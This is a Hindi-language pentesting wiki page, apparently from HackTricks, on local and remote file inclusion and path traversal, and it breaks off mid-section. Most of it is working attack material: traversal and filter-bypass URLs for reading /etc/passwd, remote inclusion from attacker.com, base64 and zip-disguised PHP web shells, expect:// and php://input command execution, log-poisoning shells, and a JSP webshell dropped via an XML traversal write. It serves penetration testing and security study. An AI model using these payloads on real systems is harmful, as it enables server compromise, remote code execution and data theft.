# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** फ़ाइल एक remote सर्वर से लोड होती है (सबसे अच्छा: आप कोड लिख सकते हैं और सर्वर उसे चलाएगा)। PHP में यह डिफ़ॉल्ट रूप से **निष्क्रिय** है (**allow_url_include**).\
**Local File Inclusion (LFI):** सर्वर एक स्थानीय फ़ाइल लोड करता है.

The vulnerability occurs when the user can control in some way the file that is going to be load by the server.

प्रवण **PHP functions**: require, require_once, include, include_once

A interesting tool to exploit this vulnerability: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**कई \*nix LFI सूचियों को मिलाकर और अधिक पथ जोड़कर मैंने यह बनाया है:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

यह भी कोशिश करें कि `/` को `\`\
यह भी कोशिश करें कि `../../../../../` जोड़ें

कई तकनीकों का उपयोग करके फ़ाइल /etc/password खोजने वाली सूची (यह जाँचने के लिए कि vulnerability मौजूद है) यहाँ मिल सकती है [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

विभिन्न wordlists का संयोजन:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

यह भी कोशिश करें कि `/` को `\`\
यह भी कोशिश करें कि `C:/` हटाएँ और `../../../../../` जोड़ें

कई तकनीकों का उपयोग करके फ़ाइल /boot.ini खोजने वाली सूची (यह जाँचने के लिए कि vulnerability मौजूद है) यहाँ मिल सकती है [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

linux की LFI सूची देखें।

## बुनियादी LFI और bypasses

सारे उदाहरण Local File Inclusion के लिए हैं लेकिन Remote File Inclusion पर भी लागू किए जा सकते हैं (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences गैर-पुनरावर्ती रूप से हटाए गए
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

प्रदान की गई string के अंत में अधिक chars जोड़ने वाले append को bypass करें (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
यह **PHP 5.4 से हल हो चुका है**

### **एन्कोडिंग**

आप गैर-मानकीकृत एन्कोडिंग्स जैसे double URL encode (और अन्य) का उपयोग कर सकते हैं:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### मौजूदा folder से

शायद back-end folder path की जाँच कर रहा है:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### सर्वर पर फ़ाइल सिस्टम डायरेक्टरीज़ का अन्वेषण

सर्वर के फ़ाइल सिस्टम को कुछ तकनीकों का उपयोग करके केवल फ़ाइलों ही नहीं बल्कि डायरेक्टरीज़ की पहचान के लिए रिकर्सिव तरीके से एक्सप्लोर किया जा सकता है। यह प्रक्रिया डायरेक्टरी की गहराई निर्धारित करने और विशिष्ट फ़ोल्डरों के अस्तित्व की जाँच करने में शामिल है। इसे प्राप्त करने का विस्तृत तरीका नीचे दिया गया है:

1. **डायरेक्टरी गहराई निर्धारित करें:** अपने वर्तमान डायरेक्टरी की गहराई का अंदाज़ा इस तरह लगाएँ कि आप `/etc/passwd` फ़ाइल को सफलतापूर्वक फ़ेच कर सकें (यदि सर्वर Linux-आधारित हो तो लागू)। एक उदाहरण URL इस प्रकार हो सकता है, जो गहराई तीन दर्शाता है:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **फ़ोल्डरों की जाँच करें:** संदिग्ध फ़ोल्डर का नाम (उदा., `private`) URL में जोड़ें, फिर `/etc/passwd` पर वापस नेविगेट करें। अतिरिक्त निर्देशिका स्तर के लिए depth को एक से बढ़ाना आवश्यक है:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **परिणामों की व्याख्या करें:** सर्वर की प्रतिक्रिया बताती है कि फ़ोल्डर मौजूद है या नहीं:
- **त्रुटि / कोई आउटपुट नहीं:** फ़ोल्डर `private` संभवतः निर्दिष्ट स्थान पर मौजूद नहीं है।
- **`/etc/passwd` की सामग्री:** `private` फ़ोल्डर की उपस्थिति की पुष्टि होती है।
4. **पुनरावर्ती अन्वेषण:** खोजे गए फ़ोल्डरों को उसी तकनीक या पारंपरिक Local File Inclusion (LFI) विधियों का उपयोग करके उपनिर्देशिकाओं या फ़ाइलों के लिए आगे जांचा जा सकता है।

फ़ाइल सिस्टम में विभिन्न स्थानों पर निर्देशिकाओं का अन्वेषण करने के लिए payload को उसी के अनुसार समायोजित करें। उदाहरण के लिए, यह जांचने के लिए कि `/var/www/` में एक `private` निर्देशिका है या नहीं (मान लें कि वर्तमान निर्देशिका की गहराई 3 है), उपयोग करें:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation वेब एप्लिकेशनों में फ़ाइल पथों को manipulate करने की एक विधि है। यह अक्सर उन restricted फ़ाइलों तक पहुँचने के लिए इस्तेमाल की जाती है जहाँ कुछ security measures फ़ाइल पथ के अंत में अतिरिक्त characters जोड़कर पहुँच रोकते हैं। उद्देश्य ऐसा फ़ाइल पथ बनाना है जो security measure द्वारा बदला जाने पर भी इच्छित फ़ाइल की ओर इशारा करता रहे।

In PHP, फ़ाइल सिस्टम की प्रकृति के कारण किसी फ़ाइल पथ के विभिन्न रूप समान माने जा सकते हैं। उदाहरण के लिए:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` सभी को एक ही पथ माना जाता है।
- जब आखिरी 6 अक्षर `passwd` हों, तो अंत में `/` जोड़ने से (जिससे यह `passwd/` बनता है) लक्षित फ़ाइल नहीं बदलती।
- इसी तरह, अगर किसी फ़ाइल पथ के साथ `.php` जुड़ा है (जैसे `shellcode.php`), तो अंत में `/.` जोड़ देने से एक्सेस की जा रही फ़ाइल में कोई परिवर्तन नहीं आता।

प्रदत्त उदाहरण दिखाते हैं कि Path truncation का उपयोग करके कैसे `/etc/passwd` तक पहुँच बनाई जा सकती है, जो अपनी संवेदनशील सामग्री (उपयोगकर्ता खाता जानकारी) के कारण आम लक्ष्य होती है:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
इन परिदृश्यों में आवश्यक ट्रैवर्सल्स की संख्या लगभग 2027 हो सकती है, पर यह संख्या सर्वर की कॉन्फ़िगरेशन के आधार पर भिन्न हो सकती है।

- **Dot Segments और अतिरिक्त कैरेक्टर का उपयोग**: Traversal sequences (`../`) को अतिरिक्त dot segments और कैरेक्टर के साथ मिलाकर filesystem में नेविगेट करने के लिए इस्तेमाल किया जा सकता है, जिससे सर्वर द्वारा जोड़े गए appended strings प्रभावी रूप से अनदेखा किए जा सकते हैं।
- **आवश्यक traversals की संख्या निर्धारित करना**: परीक्षण और त्रुटि के माध्यम से पता लगाया जा सकता है कि root directory तक और फिर `/etc/passwd` तक पहुंचने के लिए कितनी `../` sequences की सटीक आवश्यकता है, यह सुनिश्चित करते हुए कि किसी भी जोड़े गए strings (जैसे `.php`) को निष्क्रिय कर दिया गया है लेकिन इच्छित path (`/etc/passwd`) बरकरार रहे।
- **नकली directory से शुरू करना**: अक्सर path को एक अस्तित्वहीन directory (जैसे `a/`) से शुरू किया जाता है। यह तकनीक ऐहतियात के तौर पर या सर्वर के path parsing लॉजिक की आवश्यकताओं को पूरा करने के लिए प्रयुक्त होती है।

Path truncation techniques का प्रयोग करते समय, सर्वर के path parsing व्यवहार और filesystem संरचना को समझना अत्यंत महत्वपूर्ण है। प्रत्येक परिदृश्य के लिए अलग विधि की आवश्यकता हो सकती है, और सबसे प्रभावी तरीका खोजने के लिए अक्सर परीक्षण आवश्यक होता है।

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php में यह डिफ़ॉल्ट रूप से निष्क्रिय होता है क्योंकि **`allow_url_include`** **Off.** इसे काम करने के लिए **On** होना चाहिए, और उस स्थिति में आप अपने सर्वर से एक PHP फ़ाइल include करके RCE प्राप्त कर सकते हैं:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
यदि किसी कारणवश **`allow_url_include`** **On** है, लेकिन PHP बाहरी वेबपेजों तक पहुँच को **filtering** कर रहा है, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), तो आप उदाहरण के लिए data protocol के साथ base64 का उपयोग करके b64 PHP कोड को डिकोड करके और egt RCE प्राप्त कर सकते हैं:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> पिछले कोड में, अंतिम `+.txt` इसलिए जोड़ा गया था क्योंकि attacker को एक ऐसी string चाहिए थी जो `.txt` में समाप्त होती हो, इसलिए string उसी के साथ खत्म होती है और b64 decode के बाद वह हिस्सा सिर्फ जंक लौटाएगा और असली PHP code शामिल किया जाएगा (और इसलिए, execute होगा)।

एक और उदाहरण **`php://` प्रोटोकॉल का उपयोग नहीं कर रहा** होगा:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python मूल तत्व

Python में इस तरह के कोड में:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
यदि उपयोगकर्ता **absolute path** को **`file_name`** के रूप में पास करता है, तो **पिछला पथ बस हटा दिया जाता है**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
यह [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join) के अनुसार अपेक्षित व्यवहार है:

> यदि कोई घटक absolute path है, तो सभी पिछले घटक हटा दिए जाते हैं और जॉइनिंग absolute path घटक से जारी रहती है।

## Java डायरेक्टरी लिस्टिंग

ऐसा लगता है कि यदि आपके पास Java में Path Traversal है और आप फाइल के बजाय **डायरेक्टरी के लिए अनुरोध करते हैं**, तो **डायरेक्टरी की लिस्टिंग लौटाई जाती है**। यह अन्य भाषाओं में नहीं होगा (जितना मुझे पता है)।

## शीर्ष 25 पैरामीटर

यहाँ शीर्ष 25 पैरामीटरों की सूची दी गई है जो local file inclusion (LFI) vulnerabilities के लिए कमजोर हो सकते हैं (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI का उपयोग करते हुए PHP wrappers & protocols

### php://filter

PHP filters डेटा को पढ़े या लिखा जाने से पहले उस पर बुनियादी **संशोधन ऑपरेशन्स** करने की अनुमति देते हैं। फिल्टर्स की 5 श्रेणियाँ हैं:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: डेटा से टैग हटाता है (everything between "<" and ">" chars)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transforms to a different encoding(`convert.iconv.<input_enc>.<output_enc>`) . To get the **list of all the encodings** supported run in the console: `iconv -l`

> [!WARNING]
> convert.iconv.* conversion filter का दुरुपयोग करके आप **मनमाना टेक्स्ट उत्पन्न कर सकते हैं**, जो arbitrary text लिखने या include जैसी फ़ंक्शन को मनमाना टेक्स्ट प्रोसेस करवाने में उपयोगी हो सकता है। अधिक जानकारी के लिए देखें [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
- `zlib.inflate`: Decompress the data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Other Filters
- php में `var_dump(stream_get_filters());` चलाने पर आप कुछ **अनअपेक्षित filters** पा सकते हैं:
- `consumed`
- `dechunk`: HTTP chunked encoding को उलटता है
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> भाग "php://filter" case-insensitive है

### Using php filters as oracle to read arbitrary files

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) एक तकनीक प्रस्तावित की गई है जो सर्वर से आउटपुट वापस न मिलने पर भी एक local file पढ़ने की अनुमति देती है। यह तकनीक एक **boolean exfiltration of the file (char by char) using php filters** पर आधारित है जिसे oracle के रूप में उपयोग किया जाता है। इसका कारण यह है कि php filters का उपयोग किसी टेक्स्ट को इतना बड़ा करने के लिए किया जा सकता है कि php एक exception थ्रो कर दे।

मूल पोस्ट में इस तकनीक की विस्तृत व्याख्या है, पर यहाँ एक संक्षिप्त सारांश दिया गया है:

- कोडेक **`UCS-4LE`** का उपयोग टेक्स्ट के leading character को शुरुआत में छोड़ने और string के साइज को गुणात्मक रूप से बढ़ाने के लिए किया जाता है।
- इसे इस तरह इस्तेमाल किया जाता है कि **जब प्रारंभिक अक्षर सही अनुमानित होता है** तो टेक्स्ट इतना बड़ा हो जाता है कि php एक **error** ट्रिगर कर देगा।
- **dechunk** filter सब कुछ हटा देगा अगर पहला char hexadecimal नहीं है, इसलिए हम जान सकते हैं कि पहला char hex है या नहीं।
- यह, पिछले बिंदु के साथ (और अनुमानित अक्षर पर निर्भर अन्य filters के साथ), हमें टेक्स्ट की शुरुआत के एक अक्षर का अनुमान लगाने की अनुमति देता है यह देखकर कि कब हम पर्याप्त transformations करते हैं जिससे वह hexadecimal character न रहे। क्योंकि अगर hex है, तो dechunk इसे नहीं हटाएगा और initial bomb php error ट्रिगर कर देगा।
- कोडेक **convert.iconv.UNICODE.CP930** हर अक्षर को अगले अक्षर में बदल देता है (तो इस कोडेक के बाद: a -> b)। इससे हमें पता चल सकता है कि पहला अक्षर उदाहरण के लिए `a` है क्योंकि अगर हम इस कोडेक को 6 बार लागू करें तो a->b->c->d->e->f->g हो जाएगा और अक्षर अब hexadecimal character नहीं रहेगा, इसलिए dechunk उसे नहीं हटाएगा और initial bomb के कारण php error ट्रिगर होगा।
- शुरुआत में अन्य transformations जैसे **rot13** का उपयोग करके n, o, p, q, r जैसे अन्य chars को leak करना संभव है (और अन्य codecs का उपयोग करके अन्य अक्षरों को hex रेंज में लाया जा सकता है)।
- जब प्रारंभिक char कोई संख्या होती है तो उसे base64 encode करना और संख्या को leak करने के लिए पहले 2 अक्षरों को leak करना आवश्यक होता है।
- अंतिम समस्या यह है कि **प्रारम्भिक अक्षर से अधिक कैसे leak करें**। order memory filters जैसे **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** का उपयोग करके chars के order को बदलना और टेक्स्ट के अन्य अक्षरों को पहली स्थिति में लाना संभव है।
- और आगे के डेटा प्राप्त करने के लिए विचार यह है कि शुरुआत में **convert.iconv.UTF16.UTF16** के साथ **2 bytes junk data** जेनरेट करें, फिर **UCS-4LE** लागू करके इसे अगले 2 bytes के साथ pivot करवाएं, और junk data तक डेटा को delete करें (इससे initial टेक्स्ट के पहले 2 bytes हट जाएंगे)। इसे तब तक जारी रखें जब तक आप वांछित बिट तक नहीं पहुँच जाते जिसे leak करना है।

पोस्ट में इसको ऑटोमेट करने के लिए एक टूल भी जारी किया गया था: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

यह wrapper उस प्रक्रिया द्वारा खुले file descriptors तक पहुँचने की अनुमति देता है। संभावित रूप से opened files की सामग्री को exfiltrate करने के काम आ सकता है:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
You can also use **php://stdin, php://stdout and php://stderr** to access the **file descriptors 0, 1 and 2** respectively (not sure how this could be useful in an attack)

### zip:// and rar://

एक Zip या Rar फ़ाइल अपलोड करें जिसमें एक PHPShell हो और उसे एक्सेस करें.\
rar protocol का दुरुपयोग करने में सक्षम होने के लिए इसे **विशेष रूप से सक्रिय किया जाना चाहिए**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
ध्यान दें कि यह प्रोटोकॉल php कॉन्फ़िगरेशन **`allow_url_open`** और **`allow_url_include`** द्वारा प्रतिबंधित है

### expect://

Expect को सक्रिय किया जाना चाहिए। आप इसका उपयोग करके कोड निष्पादित कर सकते हैं:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

अपने payload को POST पैरामीटर्स में निर्दिष्ट करें:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

जब कोई वेब एप्लिकेशन फाइल लोड करने के लिए `include` जैसे functions का उपयोग करती है, तो `.phar` फ़ाइल का उपयोग PHP कोड को निष्पादित करने के लिए किया जा सकता है। नीचे दिया गया PHP कोड स्निपेट एक `.phar` फ़ाइल बनाने का उदाहरण दिखाता है:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` फ़ाइल को कंपाइल करने के लिए, निम्नलिखित command चलानी चाहिए:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

In cases where the LFI only performs file reading without executing the PHP code within, through functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, exploitation of a deserialization vulnerability could be attempted. This vulnerability is associated with the reading of files using the `phar` protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Very quick summary: a **3 byte overflow** in the PHP heap was abused to **alter the chain of free chunks** of anspecific size in order to be able to **write anything in any address**, so a hook was added to call **`system`**.\
It was possible to alloc chunks of specific sizes abusing more php filters.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — मेमोरी में या एक अस्थायी फ़ाइल में लिखना (यह स्पष्ट नहीं कि यह file inclusion attack में कितना उपयोगी हो सकता है)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — स्थानीय फ़ाइल सिस्टम तक पहुँच
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URLs तक पहुँच
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URLs तक पहुँच
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — पैटर्न से मेल खाने वाले pathnames खोजना (यह कुछ भी प्रिंट करने योग्य वापस नहीं करता, इसलिए यहाँ वास्तव में उपयोगी नहीं)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — ऑडियो स्ट्रीम्स (आदी फ़ाइलें पढ़ने के लिए उपयोगी नहीं)

## LFI via PHP's 'assert'

Local File Inclusion (LFI) जोखिम PHP में खास तौर पर बढ़ जाते हैं जब 'assert' फंक्शन के साथ काम किया जा रहा हो, क्योंकि यह strings के भीतर कोड execute कर सकता है। यह तब विशेष रूप से समस्याग्रस्त होता है जब इनपुट में directory traversal जैसे कैरेक्टर्स ("..") को चेक किया जा रहा हो पर सही तरीके से sanitize नहीं किया जा रहा हो।

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
जबकि इसका उद्देश्य traversal को रोकना है, यह अनजाने में code injection के लिए एक वेक्टर बना देता है। फ़ाइल की सामग्री पढ़ने के लिए इसे exploit करने के लिए, एक attacker उपयोग कर सकता है:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
इसी तरह, arbitrary system commands को execute करने के लिए, कोई उपयोग कर सकता है:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> यह तकनीक उन मामलों में प्रासंगिक है जहाँ आप **control** किए हुए **file path** को किसी **PHP function** को देते हैं जो **access a file** करेगा, पर आप फ़ाइल की सामग्री नहीं देख पाएंगे (जैसे एक साधारण कॉल **`file()`**) क्योंकि सामग्री दिखाई नहीं जाती।

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

As sumary, the technique is using the **"UCS-4LE" encoding** to make the content of a file so **big** that the **PHP function opening** the file will trigger an **error**.

Then, in order to leak the first char the filter **`dechunk`** is used along with other such as **base64** or **rot13** and finally the filters **convert.iconv.UCS-4.UCS-4LE** and **convert.iconv.UTF16.UTF-16BE** are used to **place other chars at the beggining and leak them**.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

जब सर्वर-साइड कोड जो ingest/uploads फ़ाइलें करता है destination path को user-controlled data (जैसे कि filename या URL) का उपयोग करके बनाता है बिना उसे canonicalising और validating किए, तो `..` segments और absolute paths intended directory से बाहर निकलकर arbitrary file write कर सकते हैं। यदि आप payload को किसी web-exposed directory में रख सकें, तो सामान्यतः webshell drop करके unauthenticated RCE प्राप्त हो जाती है।

Typical exploitation workflow:
- एक ऐसे endpoint या background worker में write primitive पहचानें जो path/filename स्वीकार करता है और disk पर कंटेंट लिखता है (जैसे message-driven ingestion, XML/JSON command handlers, ZIP extractors, आदि)।
- web-exposed directories निर्धारित करें। सामान्य उदाहरण:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- ऐसा traversal path बनाएं जो intended storage directory से बाहर निकलकर webroot में जा सके, और उसमें अपना webshell content शामिल करें।
- डाली गई payload पर ब्राउज़ करके commands execute करें।

Notes:
- जो vulnerable service write करता है वह non-HTTP port पर सुन सकता है (उदा., एक JMF XML listener on TCP 4004)। मुख्य वेब पोर्टल (अलग port) बाद में आपका payload सर्व करेगा।
- Java स्टैक्स पर, ये file writes अक्सर सरल `File`/`Paths` concatenation से लागू होते हैं। canonicalisation/allow-listing की कमी मूल दोष है।

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening that defeats this class of bugs:
- पाथ को canonical path में resolve करें और सुनिश्चित करें कि यह allow-listed base directory का descendant है।
- `..`, absolute roots, या drive letters वाले किसी भी path को reject करें; generated filenames को प्राथमिकता दें।
- writer को low-privileged account के रूप में चलाएँ और write directories को served roots से अलग रखें।

## Remote File Inclusion

पहले समझाया गया, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> ध्यान दें कि **यदि आप shell के लिए double quotes का उपयोग करते हैं** बजाय **simple quotes**, तो double quotes स्ट्रिंग "_**quote;**_" में बदल दी जाएँगी, **PHP एक error फेंकेगा** वहाँ और **कुछ भी execute नहीं होगा**।
>
> साथ ही, सुनिश्चित करें कि आप **write correctly the payload** वरना PHP हर बार log फ़ाइल लोड करने की कोशिश में error देगा और आपको दूसरा मौका नहीं मिलेगा।

यह अन्य logs में भी किया जा सकता है पर **be careful,** logs के अंदर का code URL encoded हो सकता है और यह Shell को नुकसान पहुँचा सकता है। header **authorisation "basic"** में "user:password" Base64 में होता है और वह logs के अंदर decode हो जाता है। PHPShell को इस header के अंदर डालना संभव है।  
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### एक्सेस लॉग पढ़कर GET-based auth tokens (token replay) हासिल करना

कई apps गलत तरीके से session/auth tokens को GET के माध्यम से स्वीकार कर लेते हैं (उदा., AuthenticationToken, token, sid)। अगर आपके पास web server logs में पहुंच देने वाला path traversal/LFI primitive है, तो आप access logs से उन tokens चुरा कर उन्हें replay करके authentication को पूरी तरह bypass कर सकते हैं।

How-to:
